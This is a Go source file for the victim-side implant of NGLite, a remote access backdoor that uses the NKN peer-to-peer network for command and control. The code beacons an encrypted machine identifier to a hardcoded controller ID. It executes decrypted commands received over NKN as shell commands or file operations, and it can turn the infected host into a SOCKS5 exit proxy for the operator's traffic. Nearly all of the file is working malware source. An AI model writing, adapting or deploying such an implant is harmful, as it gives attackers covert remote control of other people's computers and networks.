package main

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"strings"

	"NGLite/conf"
	"NGLite/internal/socks5"
	"NGLite/module/cipher"
	"NGLite/module/command"
	"NGLite/module/fileops"
	"NGLite/module/getmac"

	nkn "github.com/nknorg/nkn-sdk-go"
)

var (
	preyid             string
	socks5Server       *socks5.Server
	socks5PreyListener *socks5.PreyListener
	globalAccount      *nkn.Account
)

func main() {
	var Seed string
	flag.StringVar(&Seed, "g", "default", "group")
	flag.Parse()
	if Seed == "default" {
		Seed = conf.Seedid
	}

	initonce(Seed)
	Preylistener(Seed)

}

func Preylistener(seedid string) {
	err := func() error {

		seed, _ := hex.DecodeString(seedid)
		account, err := nkn.NewAccount(seed)
		if err != nil {
			return err
		}

		Listener, err := nkn.NewMultiClient(account, preyid, conf.TransThreads, false, clientConf)

		if err != nil {
			return err
		}

		<-Listener.OnConnect.C

		for {
			msg := <-Listener.OnMessage.C

			if AesDecode(string(msg.Data)) != "mayAttack" {
				msg.Reply(Runcommand(AesDecode(string(msg.Data))))
			}

		}

	}()
	if err != nil {
		fmt.Println(err)
	}
}

var clientConf *nkn.ClientConfig

func initonce(seedid string) {

	clientConf = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              4096,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}

	// 使用GetMacAddrsClean和GetIPsClean获取标识
	rawID := getmac.GetMacAddrsClean()[0] + getmac.GetIPsClean()[0]

	// 使用MD5哈希生成固定长度的identifier（32位十六进制）
	// 这样可以避免NKN对identifier格式的限制
	hash := md5.Sum([]byte(rawID))
	preyid = hex.EncodeToString(hash[:])

	fmt.Printf("[Prey] Raw ID: %s\n", rawID)
	fmt.Printf("[Prey] PreyID (MD5): %s\n", preyid)

	seed, _ := hex.DecodeString(seedid)
	account, err := nkn.NewAccount(seed)
	if err != nil {
		fmt.Println(err)
	}
	globalAccount = account // Save for SOCKS5 usage

	replymsg, err := Sender(preyid, conf.Hunterid, account, RsaEncode([]byte(preyid)))
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(replymsg)
	}
}

func RsaEncode(strbyte []byte) []byte {
	crypttext, err := cipher.RsaEncrypt(strbyte, []byte(conf.RsaPublicKey))
	if err != nil {
		fmt.Println(err)
	}
	return crypttext
}

func AesDecode(str string) string {
	plaintext, err := cipher.AesCbcDecrypt([]byte(str), []byte(conf.AesKey))
	if err != nil {
		fmt.Println(err)
		return "mayAttack"
	} else {
		return string(plaintext)

	}

}

func Sender(srcid string, dst string, acc *nkn.Account, msg interface{}) (string, error) {
	Listener, err := nkn.NewMultiClient(acc, dst, conf.TransThreads, false, nil)
	if err != nil {
		return "error", err
	}
	Sender, err := nkn.NewMultiClient(acc, srcid, conf.TransThreads, false, clientConf)
	if err != nil {
		return "error", err
	}

	<-Sender.OnConnect.C

	onReply, err := Sender.Send(nkn.NewStringArray(Listener.Address()), msg, nil)
	if err != nil {

		return "error", err
	}
	reply := <-onReply.C

	return string(reply.Data), nil
}

func Runcommand(cmd string) string {
	if strings.HasPrefix(cmd, "{") && strings.Contains(cmd, "\"action\"") {
		// Handle JSON commands
		var jsonCmd map[string]interface{}
		if err := json.Unmarshal([]byte(cmd), &jsonCmd); err != nil {
			return fmt.Sprintf(`{"success":false,"error":"Invalid JSON: %s"}`, err.Error())
		}

		action, ok := jsonCmd["action"].(string)
		if !ok {
			return `{"success":false,"error":"Missing action field"}`
		}

		// Handle SOCKS5 commands
		if action == "start_socks5" {
			return handleStartSocks5(jsonCmd)
		} else if action == "stop_socks5" {
			return handleStopSocks5()
		}

		// Handle file commands
		result, err := fileops.HandleFileCommand(cmd)
		if err != nil {
			return fmt.Sprintf(`{"success":false,"error":"%s"}`, err.Error())
		}
		return result
	}

	_, out, _ := command.NewCommand().Exec(cmd)
	return out
}

func handleStartSocks5(jsonCmd map[string]interface{}) string {
	fmt.Println("[SOCKS5] ========== Starting SOCKS5 Proxy (Prey Side) ==========")

	// Stop existing if running
	if socks5Server != nil {
		fmt.Println("[SOCKS5] Stopping existing SOCKS5 server...")
		socks5Server.Close()
		socks5Server = nil
	}
	if socks5PreyListener != nil {
		fmt.Println("[SOCKS5] Stopping existing NKN listener...")
		socks5PreyListener.Close()
		socks5PreyListener = nil
	}

	// Create NKN identifier for SOCKS5 tunnel
	identifier := fmt.Sprintf("%s_socks5", preyid)
	fmt.Printf("[SOCKS5] Creating NKN listener with identifier: %s\n", identifier)
	fmt.Printf("[SOCKS5] Prey ID: %s\n", preyid)
	fmt.Println("[SOCKS5] This prey will act as the EXIT node - connecting to real targets")

	// Start prey-side NKN listener (NO local SOCKS5 server needed!)
	listener, err := socks5.NewPreyListener(globalAccount, identifier, conf.TransThreads)
	if err != nil {
		fmt.Printf("[SOCKS5] ERROR: Failed to create NKN listener: %v\n", err)
		return fmt.Sprintf(`{"success":false,"error":"Failed to start NKN listener: %s"}`, err.Error())
	}
	socks5PreyListener = listener
	fmt.Printf("[SOCKS5] ✓ NKN listener created\n")
	fmt.Printf("[SOCKS5] NKN address: %s\n", listener.Addr())

	// Start listener in background
	go func() {
		fmt.Println("[SOCKS5] Starting NKN listener loop...")
		if err := listener.Start(); err != nil {
			fmt.Printf("[SOCKS5] NKN listener error: %v\n", err)
		}
	}()

	fmt.Println("[SOCKS5] ========== SOCKS5 Proxy Started ==========")
	fmt.Printf("[SOCKS5] Role: EXIT NODE (will connect to real internet targets)\n")
	fmt.Printf("[SOCKS5] NKN identifier: %s\n", identifier)
	fmt.Printf("[SOCKS5] NKN full address: %s\n", listener.Addr())
	fmt.Println("[SOCKS5] ===============================================")

	return fmt.Sprintf(`{"success":true,"nkn_addr":"%s","identifier":"%s"}`,
		listener.Addr(), identifier)
}

func handleStopSocks5() string {
	if socks5Server != nil {
		socks5Server.Close()
		socks5Server = nil
	}
	if socks5PreyListener != nil {
		socks5PreyListener.Close()
		socks5PreyListener = nil
	}

	fmt.Println("[SOCKS5] Stopped")
	return `{"success":true,"message":"SOCKS5 stopped"}`
}
